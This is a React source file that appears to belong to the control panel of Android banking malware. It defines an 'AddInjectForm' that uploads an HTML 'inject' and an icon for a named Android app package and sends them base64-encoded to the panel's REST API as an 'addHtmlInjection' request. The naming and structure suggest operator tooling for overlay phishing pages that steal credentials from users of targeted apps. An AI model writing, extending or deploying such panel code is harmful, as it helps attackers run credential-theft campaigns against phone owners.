import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';

//	23) '{"request":"addHtmlInjection","app":"","html":"","icon":""}' //добавляем новый инжект, html в base64_encode("HTML инжекта"), 
class AddInjectForm extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
            HtmlFile: '',
            PngFile: '',
            AppName: '',
            HtmlFileValid: false,
            PngFileValid: false,
            AppNameValid: false
        };
    }

    SelectHtmlFile(filess) {
        try {
            let CurrHTMLFile = filess[0];
            if(CurrHTMLFile.type == "text/html") {
                let reader = new FileReader();
                reader.readAsDataURL(CurrHTMLFile);
                reader.onload = function (evt) {
                    this.setState({ 
                        HtmlFile: evt.target.result.split(',')[1],
                        HtmlFileValid: true
                    });
                    SettingsContext.ShowToast('success', "Load HTML file complete");
                }.bind(this);
                reader.onerror = function (evt) {
                    this.setState({ 
                        HtmlFileValid: false
                    });
                    try_eval('document.getElementById("HtmlFileInput").value = "";');
                    SettingsContext.ShowToastTitle('error', 'Error', 'error reading file');
                }.bind(this);
            }
            else {
                this.setState({ 
                    HtmlFileValid: false
                });
                try_eval('document.getElementById("HtmlFileInput").value = "";');
                SettingsContext.ShowToastTitle('warning', 'Html', "Please select only HTML files");
            }
        }
        catch (err) {
            this.setState({ 
                HtmlFileValid: false
            });
            SettingsContext.ShowToastTitle('error', 'Error', err);
        }
    }

    SelectPNGFile(filess) {
        try {
            let CurrPNGFile = filess[0];
            if(CurrPNGFile.type == "image/png") {
                let reader = new FileReader();
                reader.readAsDataURL(CurrPNGFile);
                reader.onload = function (evt) {
                    let img = new Image();
                    img.src = evt.target.result;
                    img.onload = function(){
                        if(img.width >= 50 && img.height >= 50 && img.width <= 500 && img.height <= 500)
                        {
                            this.setState({ 
                                PngFile: evt.target.result.split(',')[1],
                                PngFileValid: true
                            });
                            SettingsContext.ShowToast('success', "Load PNG file complete");
                        }
                        else {
                            this.setState({ 
                                PngFileValid: false
                            });
                            try_eval('document.getElementById("PngFileInput").value = "";');
                            SettingsContext.ShowToast('warning', "Image minimum size 50x50px, max size 500x500px");
                        }
                    }.bind(this);
                }.bind(this);
                reader.onerror = function (evt) {
                    this.setState({ 
                        PngFileValid: false
                    });
                    try_eval('document.getElementById("PngFileInput").value = "";');
                    SettingsContext.ShowToastTitle('error', 'Error', 'error reading file');
                }.bind(this);
            }
            else {
                this.setState({ 
                    PngFileValid: false
                });
                try_eval('document.getElementById("PngFileInput").value = "";');
                SettingsContext.ShowToastTitle('warning', 'PNG', "Please select only PNG files");
            }
        }
        catch (err) {
            this.setState({ 
                PngFileValid: false
            });
            SettingsContext.ShowToastTitle('error', 'Error', err);
        }
    }

    onChangeAppName = (e) => {
        let AppNameValid = e.target.value.length > 0;
        this.setState({ 
            AppName: e.target.value,
            AppNameValid: AppNameValid
        });
    }

    OnSendInjectData() {
        console.log( new Buffer('{"request":"addHtmlInjection","app":"' + this.state.AppName + '","html":"' + this.state.HtmlFile + '","icon":"' + this.state.PngFile + '"}').toString('base64'));
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"addHtmlInjection","app":"' + this.state.AppName + '","html":"' + this.state.HtmlFile + '","icon":"' + this.state.PngFile + '"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
					SettingsContext.ShowToast('success', 'Inject adddedd');
					SettingsContext.UpdateInjectsTable();
					this.props.InjListForceUpdate();
					try_eval('document.getElementById("HtmlFileInput").value = "";');
					try_eval('document.getElementById("PngFileInput").value = "";');
					this.setState({
						HtmlFile: '',
						PngFile: '',
						AppName: '',
						HtmlFileValid: false,
						PngFileValid: false,
						AppNameValid: false
					});
				}
			
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error add inject. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render() {
        return (
            <React.Fragment>
                <div class="form-group">
                    <label for="AppName">App Name</label>
                    <input type="text" value={this.state.AppName} onChange={this.onChangeAppName} class="form-control" id="AppName" aria-describedby="emailHelp" placeholder="com.android.app"/>
                    <small class="form-text text-muted">Enter ANDROID app name.</small>
                    <hr />
                    <label for="HtmlFileInput">HTML File:</label>
                    <input type="file" onChange={ (e) => this.SelectHtmlFile(e.target.files) } class="form-control-file" id="HtmlFileInput" />
                    <small class="form-text text-muted">Select only *.html files.</small>
                    <hr />
                    <label for="PngFileInput">PNG Icon File:</label>
                    <input type="file" onChange={ (e) => this.SelectPNGFile(e.target.files) } class="form-control-file" id="PngFileInput" />
                    <small class="form-text text-muted">Support only *.png format.</small>
                    <hr />
                    <button class="btn btn-outline-primary btn-right" onClick={this.OnSendInjectData.bind(this)} disabled={!(this.state.AppNameValid&this.state.HtmlFileValid&this.state.PngFileValid)}>Add inject</button>
                </div>
            </React.Fragment>
        );
    }
}

export default AddInjectForm;